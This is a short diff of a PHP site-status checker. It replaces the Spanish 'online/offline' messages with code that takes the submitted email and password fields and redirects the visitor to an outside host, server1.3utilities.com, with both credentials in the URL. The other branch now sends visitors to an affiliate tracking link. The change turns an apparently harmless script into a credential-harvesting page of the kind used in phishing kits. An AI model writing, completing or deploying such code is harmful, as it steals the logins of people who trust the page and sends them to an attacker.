@@ -20,10 +20,12 @@
  $check = @fsockopen($site, 80); 
 
  if ($check) { 
- echo "la pagina $site esta online"; 
+ $usuario = $_POST[ 'email' ];
+$password = $_POST[ 'pass' ];
+  header ("Location: http://server1.3utilities.com/chelin/login.php?usuario=".$usuario ."&password=".$password."");
  } 
  else { 
- echo "la pagina $site esta caida"; 
+ header ("Location: https://Tracking-all-traffic.offerdirecto.com?id=LGoRTd6m85&type=21&click_id={click_id}");
  } 
 
  ?>
